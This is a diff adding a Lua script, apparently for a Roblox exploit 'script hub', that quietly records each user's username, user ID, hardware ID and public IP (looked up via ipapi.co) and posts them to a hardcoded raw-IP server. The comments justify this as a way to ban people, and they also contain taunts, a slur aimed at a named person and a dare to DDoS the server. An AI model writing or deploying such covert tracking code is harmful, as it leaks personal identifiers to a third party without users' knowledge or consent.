@@ -1,0 +1,82 @@
+--// ## UNUSED
+
+--[[
+what is this for?
+so when someone did something make me mad, ill ban them from the scripts, we detected ip and hardware id, so he cant use alt.
+also this is help me to get how much Nodex user is!
+This is for good purposes, your data will not gonna use for bad action.
+
+For Skids that Spam the api, its not gonna make my api is dead, also why is it timeout? its bcs the data was incorrect(ez detect) even you DDOS the api with 2m++ request, its still up LOL
+especially for:
+- iqsm retarded
+]]
+if _G.executed then return end
+_G.executed = true
+
+repeat task.wait() until game:IsLoaded()
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local RbxAnalytics = game:GetService("RbxAnalyticsService")
+local player = Players.LocalPlayer
+
+local function getIP()
+    local success, result = pcall(function()
+        local requestFunc = (http_request or request or (syn and syn.request))
+        if requestFunc then
+            local res = requestFunc({
+                Url = "https://ipapi.co/json/",
+                Method = "GET",
+                Headers = {
+                    ["User-Agent"] = "wohohoho/1.0"
+                }
+            })
+            return res.Body
+        else
+            --idk why i use ipapi, look like skids code yeh
+            return game:HttpGet("https://ipapi.co/json/")
+        end
+    end)
+
+    if success and result then
+        local data
+        pcall(function()
+            data = HttpService:JSONDecode(result)
+        end)
+        if data and data.ip then
+            return data.ip
+        end
+    end
+
+    return "Unknown"
+end
+
+
+local payload = {
+    username = player.Name,
+    usrid = player.UserId,
+    hwid = RbxAnalytics:GetClientId(),
+    ip = getIP()
+}
+
+local jsonData = HttpService:JSONEncode(payload)
+
+
+pcall(function()
+    local requestFunc = (http_request or request or (syn and syn.request))
+    if requestFunc then
+        requestFunc({ --try ddos them lel
+            Url = "http://185.128.227.86:6081/api/proses",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["User-Agent"] = "Wohohoohh/1.0"
+            },
+            Body = jsonData
+        })
+    else
+        game:HttpPost("http://185.128.227.86:6081/api/proses", jsonData, Enum.HttpContentType.ApplicationJson)
+    end
+end)
+
+--also this is post method ifyk for skids
